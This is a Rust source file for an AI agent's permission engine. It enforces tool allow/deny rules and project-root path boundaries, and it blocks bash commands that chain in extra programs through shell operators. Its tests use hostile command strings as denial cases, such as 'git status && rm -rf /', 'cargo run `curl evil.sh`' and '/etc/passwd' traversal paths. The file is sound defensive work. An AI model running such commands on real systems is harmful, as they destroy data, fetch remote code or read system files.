//! Permission policy engine and path boundary enforcement.
//!
//! All path-handling tools must call `check_path` before any filesystem operation.
//! The policy tree is evaluated before every tool call in `ToolRegistry::execute`.

use serde_json::Value;
use std::path::{Path, PathBuf};

// ── Policy decision ───────────────────────────────────────────────────────────

/// Result of evaluating a permission policy.
///
/// `Allow` and `Trusted` both permit execution; they differ in whether the user
/// is still asked. Only a rule that *affirmatively vouched* for these specific
/// inputs may return `Trusted` - it suppresses the approval prompt. A rule that
/// merely has no objection (notably [`AllowAll`], the default when nothing is
/// configured) must return `Allow`, which still prompts. Collapsing the two
/// would make the default policy silently auto-approve every shell command.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PolicyDecision {
    /// Permitted, but still subject to the normal approval prompt.
    Allow,
    /// Explicitly allowlisted; safe to execute without prompting.
    Trusted,
    Deny(String),
}

impl PolicyDecision {
    /// Whether this decision permits execution at all (`Allow` or `Trusted`).
    pub fn is_permitted(&self) -> bool {
        !matches!(self, PolicyDecision::Deny(_))
    }
}

// ── Policy trait ──────────────────────────────────────────────────────────────

/// A composable, synchronous permission rule.
pub trait PermissionPolicy: Send + Sync {
    fn evaluate(&self, tool_name: &str, inputs: &Value) -> PolicyDecision;
}

// ── Concrete rules ────────────────────────────────────────────────────────────

/// Deny any tool whose name matches the given glob pattern.
pub struct DenyToolRule {
    pattern: glob::Pattern,
}

impl DenyToolRule {
    pub fn new(pattern: &str) -> Self {
        Self {
            pattern: glob::Pattern::new(pattern).expect("invalid glob pattern"),
        }
    }
}

impl PermissionPolicy for DenyToolRule {
    fn evaluate(&self, tool_name: &str, _inputs: &Value) -> PolicyDecision {
        if self.pattern.matches(tool_name) {
            PolicyDecision::Deny(format!("tool '{}' is denied by policy", tool_name))
        } else {
            PolicyDecision::Allow
        }
    }
}

/// Allow any tool whose name matches the given glob pattern; deny otherwise.
pub struct AllowToolRule {
    pattern: glob::Pattern,
}

impl AllowToolRule {
    pub fn new(pattern: &str) -> Self {
        Self {
            pattern: glob::Pattern::new(pattern).expect("invalid glob pattern"),
        }
    }
}

impl PermissionPolicy for AllowToolRule {
    fn evaluate(&self, tool_name: &str, _inputs: &Value) -> PolicyDecision {
        if self.pattern.matches(tool_name) {
            PolicyDecision::Allow
        } else {
            PolicyDecision::Deny(format!("tool '{}' not in allowlist", tool_name))
        }
    }
}

/// Deny if any path-valued input starts with (or equals) the given prefix.
pub struct DenyPathPrefixRule {
    prefix: PathBuf,
}

impl DenyPathPrefixRule {
    pub fn new(raw: &str) -> Self {
        Self {
            prefix: PathBuf::from(raw),
        }
    }
}

impl PermissionPolicy for DenyPathPrefixRule {
    fn evaluate(&self, _tool_name: &str, inputs: &Value) -> PolicyDecision {
        if let Some(obj) = inputs.as_object() {
            for key in ["path", "file_path", "directory", "dir", "pattern"] {
                if let Some(Value::String(p)) = obj.get(key) {
                    let candidate = normalize_path(Path::new(p));
                    if candidate.starts_with(&self.prefix) {
                        return PolicyDecision::Deny(format!(
                            "access to path '{}' is denied by policy",
                            p
                        ));
                    }
                }
            }
        }
        PolicyDecision::Allow
    }
}

/// Deny if any path-valued input escapes the configured project root.
pub struct PathBoundaryRule {
    pub root: PathBuf,
}

impl PathBoundaryRule {
    /// Validate a single path against the project root.
    fn check(&self, raw: &str) -> PolicyDecision {
        let candidate_orig = Path::new(raw);

        // Resolve relative paths against the project root so that "foo.txt"
        // is treated as "<root>/foo.txt" rather than the process cwd.
        let owned;
        let candidate: &Path = if candidate_orig.is_absolute() {
            candidate_orig
        } else {
            owned = self.root.join(candidate_orig);
            &owned
        };

        if candidate.exists() {
            // Both sides canonicalized — handles symlinks and UNC prefix consistently.
            let resolved = match std::fs::canonicalize(candidate) {
                Ok(p) => p,
                Err(e) => {
                    return PolicyDecision::Deny(format!("cannot resolve path: {}", e));
                }
            };
            let root_canonical =
                std::fs::canonicalize(&self.root).unwrap_or_else(|_| normalize_path(&self.root));
            if resolved.starts_with(&root_canonical) {
                PolicyDecision::Allow
            } else {
                PolicyDecision::Deny(format!(
                    "path '{}' escapes project boundary '{}'",
                    resolved.display(),
                    self.root.display()
                ))
            }
        } else {
            // Non-existent path (e.g. a file about to be written). Resolve
            // symlinks in whatever prefix of it *does* exist - e.g. on
            // macOS, TempDir's base is under `/var`, itself a symlink to
            // `/private/var`. `self.root` was canonicalized by `check_path`
            // (resolving that symlink) before reaching here, but a brand
            // new file under it, left untouched, would not be - making an
            // otherwise-valid path look like it escapes the (canonicalized)
            // root. The root may still carry a `\\?\` verbatim prefix while
            // the candidate does not (or vice versa after this resolution),
            // so strip it from both sides before comparing, or an absolute
            // path *inside* the root is rejected as an escape: `D:\proj\new.md`
            // does not `starts_with` `\\?\D:\proj`.
            let resolved = strip_verbatim_prefix(&resolve_existing_prefix(candidate));
            let root_normalized = strip_verbatim_prefix(&normalize_path(&self.root));
            if resolved.starts_with(&root_normalized) {
                PolicyDecision::Allow
            } else {
                PolicyDecision::Deny(format!(
                    "path '{}' escapes project boundary '{}'",
                    resolved.display(),
                    self.root.display()
                ))
            }
        }
    }
}

/// Strip Windows' `\\?\` verbatim prefix, so a canonicalized path and a plain one
/// can be compared component-wise.
///
/// `Path::canonicalize` returns verbatim paths on Windows (`\\?\D:\proj`) while a
/// path the model supplies is plain (`D:\proj\file`). Comparing the two directly
/// with `starts_with` always fails, since the verbatim prefix is a distinct leading
/// component. On non-Windows this is the identity.
fn strip_verbatim_prefix(path: &Path) -> PathBuf {
    #[cfg(windows)]
    {
        use std::path::{Component, Prefix};

        if let Some(Component::Prefix(p)) = path.components().next() {
            match p.kind() {
                // \\?\D:\... → D:\...
                Prefix::VerbatimDisk(letter) => {
                    let rest: PathBuf = path.components().skip(1).collect();
                    let mut out = PathBuf::from(format!("{}:", letter as char));
                    out.push(&rest);
                    return out;
                }
                // \\?\UNC\server\share\... → \\server\share\...
                Prefix::VerbatimUNC(server, share) => {
                    let rest: PathBuf = path.components().skip(1).collect();
                    let mut out = PathBuf::from(r"\\");
                    out.push(server);
                    out.push(share);
                    out.push(&rest);
                    return out;
                }
                _ => {}
            }
        }
    }
    path.to_path_buf()
}

impl PermissionPolicy for PathBoundaryRule {
    fn evaluate(&self, _tool_name: &str, inputs: &Value) -> PolicyDecision {
        // Check all string values in the inputs object that look like paths
        if let Some(obj) = inputs.as_object() {
            for key in ["path", "file_path", "directory", "dir", "pattern"] {
                if let Some(Value::String(p)) = obj.get(key) {
                    let decision = self.check(p);
                    if decision != PolicyDecision::Allow {
                        return decision;
                    }
                }
            }
        }
        PolicyDecision::Allow
    }
}

/// Allow bash only if the command starts with one of the permitted programs.
pub struct BashCommandAllowlist {
    pub allowed_programs: Vec<String>,
}

impl PermissionPolicy for BashCommandAllowlist {
    fn evaluate(&self, tool_name: &str, inputs: &Value) -> PolicyDecision {
        if tool_name != "bash" {
            return PolicyDecision::Allow;
        }
        let cmd = inputs.get("command").and_then(|v| v.as_str()).unwrap_or("");

        // Only the first token is checked against the allowlist, so an active
        // shell operator would let an allowed program smuggle in arbitrary
        // ones (e.g. "git status & rm -rf /", "cargo run `curl …`").
        if let Some(op) = find_active_shell_operator(cmd) {
            return PolicyDecision::Deny(format!(
                "bash command contains shell operator {:?}, which is not allowed under an allowlist policy",
                op
            ));
        }

        let program = cmd.split_whitespace().next().unwrap_or("");
        if self.allowed_programs.iter().any(|p| p == program) {
            // Vouched for: the program is on the user's allowlist and the
            // command carries no active shell operator, so it cannot smuggle in
            // anything else. Safe to run without re-prompting every time.
            PolicyDecision::Trusted
        } else {
            // NOT on the allowlist -> `Allow`, NOT `Deny`. The allowlist decides
            // only what runs *without a prompt* (Trusted); a command that isn't
            // on it is not forbidden, it simply must go through the normal
            // approval gate. Returning `Deny` here vetoed the command even after
            // the user explicitly approved it at the prompt (approval sets
            // `auto_approve`, which bypasses the approval check but NOT a policy
            // Deny), so e.g. an approved `mkdir exercice1` silently never ran.
            // The shell-operator `Deny` above still stands: approval cannot
            // safely be given for a command that can smuggle in other programs.
            PolicyDecision::Allow
        }
    }
}

/// Find the first shell operator in `cmd` that the shell would actually
/// interpret, skipping operator characters that are quoted or escaped.
///
/// Quoting rules mirror POSIX sh: single quotes make everything literal;
/// inside double quotes most metacharacters are literal but command
/// substitution (`` ` `` and `$(`) stays active; a backslash outside single
/// quotes escapes the next character.
pub fn find_active_shell_operator(cmd: &str) -> Option<&'static str> {
    let mut chars = cmd.chars().peekable();
    let mut in_single = false;
    let mut in_double = false;

    while let Some(c) = chars.next() {
        if in_single {
            if c == '\'' {
                in_single = false;
            }
            continue;
        }
        match c {
            '\\' => {
                chars.next();
            }
            '\'' if !in_double => in_single = true,
            '"' => in_double = !in_double,
            // Command substitution executes even inside double quotes.
            '`' => return Some("`"),
            '$' if chars.peek() == Some(&'(') => return Some("$("),
            _ if in_double => {}
            ';' => return Some(";"),
            '|' => return Some("|"),
            '&' => return Some("&"),
            '>' => return Some(">"),
            '<' => return Some("<"),
            '\n' => return Some("newline"),
            _ => {}
        }
    }
    None
}

// ── Combinators ───────────────────────────────────────────────────────────────

/// All children must Allow; short-circuits on first Deny.
pub struct AndPolicy(pub Vec<Box<dyn PermissionPolicy>>);

impl PermissionPolicy for AndPolicy {
    fn evaluate(&self, tool_name: &str, inputs: &Value) -> PolicyDecision {
        // A Deny from any rule wins, so evaluation cannot short-circuit on
        // Trusted - doing so would let an allowlisted bash command skip the
        // deny_paths/deny_tools rules that follow it. Trust is only carried out
        // of the loop if every rule was consulted and none denied.
        let mut trusted = false;
        for rule in &self.0 {
            match rule.evaluate(tool_name, inputs) {
                PolicyDecision::Deny(reason) => return PolicyDecision::Deny(reason),
                PolicyDecision::Trusted => trusted = true,
                PolicyDecision::Allow => {}
            }
        }
        if trusted {
            PolicyDecision::Trusted
        } else {
            PolicyDecision::Allow
        }
    }
}

/// First permitting decision wins; short-circuits on it, preserving whether
/// that decision was `Trusted` (vouched for) or a plain `Allow`.
pub struct OrPolicy(pub Vec<Box<dyn PermissionPolicy>>);

impl PermissionPolicy for OrPolicy {
    fn evaluate(&self, tool_name: &str, inputs: &Value) -> PolicyDecision {
        let mut last_deny = PolicyDecision::Deny("no rules matched".to_string());
        for rule in &self.0 {
            let d = rule.evaluate(tool_name, inputs);
            if d.is_permitted() {
                return d;
            }
            last_deny = d;
        }
        last_deny
    }
}

/// Inverts the child decision.
pub struct NotPolicy(pub Box<dyn PermissionPolicy>);

impl PermissionPolicy for NotPolicy {
    fn evaluate(&self, tool_name: &str, inputs: &Value) -> PolicyDecision {
        match self.0.evaluate(tool_name, inputs) {
            // Trusted is a stronger Allow, so it negates to Deny just the same;
            // negation must never manufacture trust out of a Deny.
            PolicyDecision::Allow | PolicyDecision::Trusted => {
                PolicyDecision::Deny("negated allow".to_string())
            }
            PolicyDecision::Deny(_) => PolicyDecision::Allow,
        }
    }
}

/// Always allows everything (useful as a no-op default).
pub struct AllowAll;

impl PermissionPolicy for AllowAll {
    fn evaluate(&self, _: &str, _: &Value) -> PolicyDecision {
        PolicyDecision::Allow
    }
}

// ── Public helper ─────────────────────────────────────────────────────────────

/// Check a single path against the project root. Returns `Err` with denial reason.
///
/// Relative paths are resolved against `root` before the boundary check.
/// The root is canonicalized if it exists so that symlinked temp dirs work correctly.
pub fn check_path(raw: &str, root: &Path) -> Result<(), String> {
    let canonical_root = root.canonicalize().unwrap_or_else(|_| root.to_path_buf());
    let resolved = if Path::new(raw).is_absolute() {
        raw.to_string()
    } else {
        canonical_root.join(raw).to_string_lossy().into_owned()
    };
    let rule = PathBoundaryRule {
        root: canonical_root,
    };
    let inputs = serde_json::json!({ "path": resolved });
    match rule.evaluate("", &inputs) {
        PolicyDecision::Deny(reason) => Err(reason),
        // A path boundary check only asks permitted-or-not; it never grants trust.
        d => {
            debug_assert!(d.is_permitted());
            Ok(())
        }
    }
}

// ── Private helpers ───────────────────────────────────────────────────────────

/// Resolve `..` components in a path without requiring the path to exist.
fn normalize_path(path: &Path) -> PathBuf {
    let mut result = PathBuf::new();
    for component in path.components() {
        match component {
            std::path::Component::ParentDir => {
                result.pop();
            }
            std::path::Component::CurDir => {}
            c => result.push(c),
        }
    }
    result
}

/// Resolve symlinks in the longest existing prefix of `path`, then append
/// whatever trailing components don't exist yet, lexically normalized.
///
/// A path that doesn't fully exist can't be `canonicalize`d outright, but
/// leaving it completely untouched breaks comparison against an
/// already-canonicalized root the moment any *existing* ancestor of the
/// path is itself a symlink - e.g. on macOS, where a temp directory lives
/// under `/var`, a symlink to `/private/var`: `root.canonicalize()`
/// resolves it, but a brand new file path under that same root, left as
/// plain `/var/...`, no longer shares a prefix with the resolved
/// `/private/var/...` root even though it's the same location.
fn resolve_existing_prefix(path: &Path) -> PathBuf {
    if path.exists() {
        return std::fs::canonicalize(path).unwrap_or_else(|_| normalize_path(path));
    }

    let mut tail = Vec::new();
    let mut current = path;
    loop {
        let (parent, name) = match (current.parent(), current.file_name()) {
            (Some(parent), Some(name)) => (parent, name),
            // Ran out of ancestors (reached a root component) without
            // finding anything that exists - nothing to resolve.
            _ => return normalize_path(path),
        };
        tail.push(name.to_os_string());
        if parent.exists() {
            let mut resolved =
                std::fs::canonicalize(parent).unwrap_or_else(|_| normalize_path(parent));
            for component in tail.into_iter().rev() {
                resolved.push(component);
            }
            return resolved;
        }
        current = parent;
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    fn make_root() -> (TempDir, PathBuf) {
        let tmp = TempDir::new().unwrap();
        let root = std::fs::canonicalize(tmp.path()).unwrap();
        (tmp, root)
    }

    #[test]
    fn absolute_path_outside_root_denied() {
        let (_tmp, root) = make_root();
        let rule = PathBoundaryRule { root };
        let d = rule.evaluate("read_file", &serde_json::json!({ "path": "/etc/passwd" }));
        assert!(matches!(d, PolicyDecision::Deny(_)));
    }

    /// Regression: an absolute path to a file that does not exist *yet*, inside the
    /// root, was denied as an escape.
    ///
    /// `canonicalize` yields a verbatim path on Windows (`\\?\D:\proj`), but a
    /// non-existent candidate cannot be canonicalized, so it stays plain
    /// (`D:\proj\new.md`). `starts_with` then compares a plain path against a
    /// verbatim one and fails. Every existing test used paths that exist, which take
    /// the canonicalize-both-sides branch and so never hit this.
    ///
    /// The visible symptom was write_file/read_file refusing perfectly ordinary
    /// paths inside the workspace with "escapes project boundary".
    /// These go through `check_path`, the entry point the tools actually call. That
    /// matters: `check_path` canonicalizes the root itself (yielding `\\?\D:\...` on
    /// Windows) while the candidate arrives from the model as a plain string. Tests
    /// that construct `PathBoundaryRule` directly from an already-canonical root
    /// derive the candidate from it too, so both sides carry the prefix and the bug
    /// is invisible - which is exactly why this went unnoticed.
    #[test]
    fn absolute_path_to_nonexistent_file_inside_root_allowed() {
        let tmp = TempDir::new().unwrap();
        let root = tmp.path(); // plain, un-canonicalized - as the caller supplies it
        let new_file = root.join("does-not-exist-yet.md");
        assert!(!new_file.exists(), "test requires a non-existent path");

        assert_eq!(
            check_path(new_file.to_str().unwrap(), root),
            Ok(()),
            "an absolute path inside the root must be allowed even when the file \
             does not exist yet",
        );
    }

    /// The exact shape that failed in the wild: `<root>\.crustly\crustly.md`, absent.
    #[test]
    fn absolute_path_to_nonexistent_file_in_subdir_allowed() {
        let tmp = TempDir::new().unwrap();
        let root = tmp.path();
        let subdir = root.join(".crustly");
        std::fs::create_dir_all(&subdir).unwrap();
        let new_file = subdir.join("crustly.md");
        assert!(!new_file.exists());

        assert_eq!(check_path(new_file.to_str().unwrap(), root), Ok(()));
    }

    /// The prefix fix must not weaken the boundary: a non-existent path *outside*
    /// the root is still an escape.
    #[test]
    fn absolute_path_to_nonexistent_file_outside_root_still_denied() {
        let tmp = TempDir::new().unwrap();
        let root = tmp.path();
        let outside = root
            .parent()
            .unwrap()
            .join("elsewhere-does-not-exist")
            .join("secret.md");

        assert!(
            check_path(outside.to_str().unwrap(), root).is_err(),
            "a non-existent path outside the root must still be denied",
        );
    }

    /// Regression (macOS CI failure): reproduces the exact failure mode
    /// with a real symlink, so it's caught on any platform rather than
    /// only on macOS, where a temp directory's own base lives under
    /// `/var`, itself a symlink to `/private/var`. `check_path`
    /// canonicalizes the root (resolving the symlink), but a non-existent
    /// candidate built from the unresolved symlinked root (exactly what
    /// `TempDir::path()` returns on macOS) was previously left completely
    /// untouched, so it no longer shared a prefix with the canonicalized
    /// root and was wrongly denied as an escape.
    #[cfg(unix)]
    #[test]
    fn absolute_path_to_nonexistent_file_through_a_symlinked_root_allowed() {
        let real_dir = TempDir::new().unwrap();
        let link_path = real_dir
            .path()
            .parent()
            .unwrap()
            .join(format!("symlink-root-{}", std::process::id()));
        std::os::unix::fs::symlink(real_dir.path(), &link_path).unwrap();

        // The caller passes the *symlinked* root, unresolved.
        let new_file = link_path.join("new-file.md");
        assert!(!new_file.exists());

        let result = check_path(new_file.to_str().unwrap(), &link_path);
        let _ = std::fs::remove_file(&link_path);
        assert_eq!(
            result,
            Ok(()),
            "a non-existent path under a symlinked root must be allowed"
        );
    }

    #[test]
    fn valid_path_inside_root_allowed() {
        let (_tmp, root) = make_root();
        let file = root.join("main.rs");
        std::fs::write(&file, "").unwrap();
        let rule = PathBoundaryRule { root };
        let d = rule.evaluate(
            "read_file",
            &serde_json::json!({ "path": file.to_str().unwrap() }),
        );
        assert_eq!(d, PolicyDecision::Allow);
    }

    #[test]
    fn and_policy_short_circuits_on_deny() {
        use std::sync::atomic::{AtomicBool, Ordering};
        use std::sync::Arc;

        struct PanicIfCalled(Arc<AtomicBool>);
        impl PermissionPolicy for PanicIfCalled {
            fn evaluate(&self, _: &str, _: &Value) -> PolicyDecision {
                self.0.store(true, Ordering::SeqCst);
                PolicyDecision::Allow
            }
        }

        let called = Arc::new(AtomicBool::new(false));
        let policy = AndPolicy(vec![
            Box::new(DenyToolRule::new("bash")),
            Box::new(PanicIfCalled(called.clone())),
        ]);
        let d = policy.evaluate("bash", &serde_json::json!({}));
        assert!(matches!(d, PolicyDecision::Deny(_)));
        assert!(
            !called.load(Ordering::SeqCst),
            "second rule must not be evaluated"
        );
    }

    #[test]
    fn or_policy_short_circuits_on_allow() {
        use std::sync::atomic::{AtomicBool, Ordering};
        use std::sync::Arc;

        struct PanicIfCalled(Arc<AtomicBool>);
        impl PermissionPolicy for PanicIfCalled {
            fn evaluate(&self, _: &str, _: &Value) -> PolicyDecision {
                self.0.store(true, Ordering::SeqCst);
                PolicyDecision::Deny("second".to_string())
            }
        }

        let called = Arc::new(AtomicBool::new(false));
        let policy = OrPolicy(vec![
            Box::new(AllowAll),
            Box::new(PanicIfCalled(called.clone())),
        ]);
        let d = policy.evaluate("read_file", &serde_json::json!({}));
        assert_eq!(d, PolicyDecision::Allow);
        assert!(
            !called.load(Ordering::SeqCst),
            "second rule must not be evaluated"
        );
    }

    #[test]
    fn bash_allowlist_trusts_listed_prompts_for_unlisted() {
        let rule = BashCommandAllowlist {
            allowed_programs: vec!["cargo".to_string(), "git".to_string()],
        };
        // Allowlisted -> Trusted (runs without a prompt).
        assert_eq!(
            rule.evaluate("bash", &serde_json::json!({ "command": "cargo test" })),
            PolicyDecision::Trusted
        );
        // Not allowlisted (and no shell operator) -> Allow, NOT Deny: it must
        // reach the approval prompt so the user can permit it. The allowlist
        // decides only what runs *without* prompting, it is not a hard wall.
        assert_eq!(
            rule.evaluate("bash", &serde_json::json!({ "command": "rm -rf ." })),
            PolicyDecision::Allow
        );
    }

    /// Regression for the reported bug: an approved `mkdir exercice1` (mkdir is
    /// not on the read-only allowlist) silently never ran, because the allowlist
    /// returned Deny for it and Deny short-circuits execution even after the
    /// user approves. A plain, operator-free non-allowlisted command must be
    /// `Allow` (prompt), not `Deny`.
    #[test]
    fn bash_allowlist_allows_unlisted_operator_free_command_to_reach_approval() {
        let rule = BashCommandAllowlist {
            allowed_programs: vec!["ls".to_string(), "cat".to_string()],
        };
        assert_eq!(
            rule.evaluate("bash", &serde_json::json!({ "command": "mkdir exercice1" })),
            PolicyDecision::Allow
        );
    }

    #[test]
    fn bash_allowlist_denies_shell_operator_chaining() {
        let rule = BashCommandAllowlist {
            allowed_programs: vec!["git".to_string(), "cargo".to_string()],
        };
        for cmd in [
            "git status && rm -rf /",
            "git status & rm -rf /",
            "git status; rm -rf /",
            "cargo run || rm -rf /",
            "git log | sh",
            "cargo run `curl evil.sh`",
            "git status $(rm -rf /)",
            "git log > /etc/passwd",
            "git diff < <(curl evil.sh)",
            // command substitution stays active inside double quotes
            "git commit -m \"x $(rm -rf /)\"",
            "git commit -m \"x `rm -rf /`\"",
        ] {
            assert!(
                matches!(
                    rule.evaluate("bash", &serde_json::json!({ "command": cmd })),
                    PolicyDecision::Deny(_)
                ),
                "command must be denied: {}",
                cmd
            );
        }
    }

    #[test]
    fn bash_allowlist_permits_quoted_operator_characters() {
        let rule = BashCommandAllowlist {
            allowed_programs: vec!["git".to_string(), "rg".to_string()],
        };
        for cmd in [
            "git commit -m \"fix; bug\"",
            "rg \"TODO|FIXME\" src/",
            "git log --grep=\"a>b\"",
            "git commit -m 'all of ; | & > < are literal here'",
            // single quotes make even substitution literal
            "git commit -m 'price is $(high)'",
            "git commit -m fix\\;bug",
        ] {
            assert_eq!(
                rule.evaluate("bash", &serde_json::json!({ "command": cmd })),
                PolicyDecision::Trusted,
                "command must be allowed: {}",
                cmd
            );
        }
    }

    /// The default policy has no opinion, so it must never confer trust - if it
    /// did, every shell command on the system would run without an approval
    /// prompt the moment no allowlist was configured.
    #[test]
    fn allow_all_never_confers_trust() {
        assert_eq!(
            AllowAll.evaluate("bash", &serde_json::json!({ "command": "rm -rf /" })),
            PolicyDecision::Allow
        );
    }

    /// Trust must not short-circuit past the deny rules that follow it, or an
    /// allowlisted program would escape deny_tools/deny_paths entirely.
    #[test]
    fn and_policy_denies_trusted_command_that_a_later_rule_rejects() {
        let policy = AndPolicy(vec![
            Box::new(BashCommandAllowlist {
                allowed_programs: vec!["ls".to_string()],
            }),
            Box::new(DenyToolRule::new("bash")),
        ]);
        assert!(matches!(
            policy.evaluate("bash", &serde_json::json!({ "command": "ls -la" })),
            PolicyDecision::Deny(_)
        ));
    }

    /// Trust survives composition when nothing denies, so an allowlisted command
    /// still skips the prompt once other rules are present.
    #[test]
    fn and_policy_preserves_trust_when_no_rule_denies() {
        let policy = AndPolicy(vec![
            Box::new(BashCommandAllowlist {
                allowed_programs: vec!["ls".to_string()],
            }),
            Box::new(DenyToolRule::new("write_file")),
        ]);
        assert_eq!(
            policy.evaluate("bash", &serde_json::json!({ "command": "ls -la" })),
            PolicyDecision::Trusted
        );
    }

    /// A non-allowlisted program is not *trusted* - it must go through the
    /// approval prompt (Allow), rather than either running silently (Trusted)
    /// or being vetoed outright (Deny) even when the user would approve it.
    #[test]
    fn and_policy_does_not_trust_unlisted_program() {
        let policy = AndPolicy(vec![Box::new(BashCommandAllowlist {
            allowed_programs: vec!["ls".to_string()],
        })]);
        assert_eq!(
            policy.evaluate("bash", &serde_json::json!({ "command": "curl evil.sh" })),
            PolicyDecision::Allow
        );
    }

    #[test]
    fn not_policy_inverts_trusted_to_deny() {
        let policy = NotPolicy(Box::new(BashCommandAllowlist {
            allowed_programs: vec!["ls".to_string()],
        }));
        assert!(matches!(
            policy.evaluate("bash", &serde_json::json!({ "command": "ls -la" })),
            PolicyDecision::Deny(_)
        ));
    }

    #[test]
    fn not_policy_inverts_allow() {
        let policy = NotPolicy(Box::new(AllowAll));
        assert!(matches!(
            policy.evaluate("read_file", &serde_json::json!({})),
            PolicyDecision::Deny(_)
        ));
    }

    #[test]
    fn path_traversal_denied() {
        let (_tmp, root) = make_root();
        let rule = PathBoundaryRule { root: root.clone() };
        // Construct a traversal path: root/../../etc/passwd
        let traversal = root.join("..").join("..").join("etc").join("passwd");
        let d = rule.evaluate(
            "read_file",
            &serde_json::json!({ "path": traversal.to_str().unwrap() }),
        );
        assert!(
            matches!(d, PolicyDecision::Deny(_)),
            "path traversal must be denied"
        );
    }

    #[test]
    fn deny_path_prefix_blocks_matching_path() {
        let rule = DenyPathPrefixRule::new("/etc");
        let d = rule.evaluate("read_file", &serde_json::json!({ "path": "/etc/passwd" }));
        assert!(matches!(d, PolicyDecision::Deny(_)));
    }

    #[test]
    fn deny_path_prefix_allows_unrelated_path() {
        let (_tmp, root) = make_root();
        let rule = DenyPathPrefixRule::new("/etc");
        let file = root.join("main.rs");
        let d = rule.evaluate(
            "read_file",
            &serde_json::json!({ "path": file.to_str().unwrap() }),
        );
        assert_eq!(d, PolicyDecision::Allow);
    }

    #[cfg(unix)]
    #[test]
    fn symlink_outside_root_denied() {
        let (_tmp, root) = make_root();
        let link_path = root.join("escape_link");
        std::os::unix::fs::symlink("/etc", &link_path).unwrap();
        let rule = PathBoundaryRule { root };
        let d = rule.evaluate(
            "read_file",
            &serde_json::json!({ "path": link_path.join("passwd").to_str().unwrap() }),
        );
        assert!(
            matches!(d, PolicyDecision::Deny(_)),
            "symlink outside root must be denied"
        );
    }
}
